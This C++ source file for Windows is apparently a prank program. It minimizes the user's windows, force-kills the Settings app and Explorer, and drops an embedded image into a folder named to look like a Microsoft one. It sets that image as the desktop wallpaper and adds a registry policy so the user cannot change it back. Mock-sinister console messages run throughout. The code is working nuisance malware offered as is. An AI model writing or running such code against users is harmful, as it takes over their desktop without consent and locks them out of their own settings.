// chevron.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <direct.h>
#include <windows.h>
#include "resource.h"

#define WALLPAPER "C:\\ProgramData\\Microsoft Management\\icon.png"

HWND console;

BOOL CALLBACK windowCallback(HWND hWnd, LPARAM lParam) {
	if (hWnd != console && IsWindowVisible(hWnd)) {
		PostMessage(hWnd, WM_SYSCOMMAND, SC_MINIMIZE, 0);
	}
	return TRUE;
}

int main()
{
	SetConsoleCtrlHandler(NULL, TRUE);
	console = GetConsoleWindow();
	printf(">loading setup\n");
	ShowWindow(console, SW_HIDE);
	SetWindowLong(console, GWL_STYLE, WS_VISIBLE | WS_EX_NOACTIVATE);
	ShowWindow(console, SW_SHOW);
	SetWindowPos(console, NULL, 0, 0, 0, 0, SWP_FRAMECHANGED | SWP_NOZORDER | SWP_NOOWNERZORDER | SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
	SetActiveWindow(console);
	SetForegroundWindow(console);
	//ShowWindow(console, SW_MAXIMIZE);

	EnumWindows(windowCallback, 0);

	Sleep(5000);
	printf(">Corrupting Mind\n");
	system("taskkill /F /IM SystemSettings.exe >nul 2>&1");
	
	Sleep(1000);

	// Get binary of the local resource in the EXE
	HRSRC hrWallpaper = FindResource(NULL, MAKEINTRESOURCE(IDB_PNG1), TEXT("PNG"));
	DWORD dWallpaperSize = SizeofResource(NULL, hrWallpaper);
	HGLOBAL hgWallpaper = LoadResource(NULL, hrWallpaper);
	LPVOID pWallpaperData = LockResource(hgWallpaper);

	_mkdir("C:\\ProgramData\\Microsoft Management");

	printf(">Deleting heretical wallpaper\n");
	
	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)TEXT("SOME INVALID SHIT"), SPIF_UPDATEINIFILE);
	Sleep(5000);
	// Save the wallpaper out to some random file
	FILE* fWallpaperFile = fopen(WALLPAPER, "wb");
	fwrite(pWallpaperData, 1, dWallpaperSize, fWallpaperFile);
	fclose(fWallpaperFile);

	printf(">Enthralling desktop wallpaper\n");
	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)TEXT(WALLPAPER), SPIF_UPDATEINIFILE);
	Sleep(5000);
	printf(">Deleting resistance\n");
	system("reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop /v NoChangingWallPaper /t REG_DWORD /d 1 /f");
	Sleep(1000);
	printf(".\n");
	Sleep(1000);
	printf(".\n");
	Sleep(1000);
	printf(".\n");
	Sleep(1000);
	printf(">Done\n");
	Sleep(1000);
	printf(">Rebooting in Goddess mode\n");
	system("taskkill /F /IM explorer.exe >nul 2>&1");
	Sleep(10000);
	system("explorer");
	Sleep(5000);
}
